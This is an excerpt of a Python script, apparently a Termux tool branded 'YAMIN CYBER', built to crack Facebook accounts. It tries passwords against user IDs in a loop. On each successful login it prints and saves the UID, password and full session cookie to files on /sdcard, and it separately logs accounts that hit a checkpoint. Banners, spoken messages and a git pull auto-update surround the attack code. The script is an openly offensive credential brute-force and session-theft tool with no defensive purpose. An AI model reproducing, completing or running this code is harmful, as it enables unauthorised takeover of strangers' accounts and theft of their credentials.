...
import os
print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] YAMIN CYBER (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 300 "Robot install complete"')
print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS YAMIN CYBER KING YAMIN\033[1;30m")
os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH YAMIN CYBER KING OFF YAMIN "')
os.system("git pull")
...
logo = ("""
  ...
  \033[33;1m#     #    \033[34;1m#     \033[37;1m#     #   \x1b[38;5;196m### \033[38;5;46m#     #    
   \033[33;1m#   #    \033[34;1m# #    \033[37;1m##   ##    \x1b[38;5;196m#  \033[38;5;46m##    #    
    \033[33;1m# #    \033[34;1m#   #   \033[37;1m# # # #    \x1b[38;5;196m#  \033[38;5;46m# #   #    
     \033[33;1m#    \033[34;1m#     #  \033[37;1m#  #  #    \x1b[38;5;196m#  \033[38;5;46m#  #  #    
     \033[33;1m#    \033[34;1m#######  \033[37;1m#     #    \x1b[38;5;196m#  \033[38;5;46m#   # #    
...
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢𝐌⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46mYAMIN            ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢𝐑⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46mMD YAMIN HOSSAIN       ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢𝐀⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m no    ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢𝐍⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46mon║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢𝐊⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐈𝐌𝐎      ║  ࿇⃝🌹⃢𝐈⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46mop     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢𝐍⃢🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
\x1b[38;5;196m╚═════════════╝  ࿇⃝🌹⃢𝐆⃢🌹⃝࿇  \033[38;5;46m╚══════════════════╝""")
os.system('espeak -a 300 "author YAMIN "')
os.system('espeak -a 300 "Facebook  YAMIN hossain "')
os.system('espeak -a 300 "github YAMIN cyber YM "')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[38;5;46m [YAMIN-𝟬𝟰𝟵𝟵-OK💙] ' +uid+ ' | ' +ps+    '  \n \033[1;33m[√]\033[1;32mCookie = \033[38;5;46m'+coki+  '  ''  \033[1;34m')
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/YAMIN-𝟬𝟰𝟵𝟵-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[38;5;46m [YAMIN💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/\033[38;5;46mYAMIN-𝟬𝟰𝟵𝟵-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['YAMIN CYBER','YAMIN-CYBER ','YAMIN CRACK '])
        ...
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mYAMIN💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()
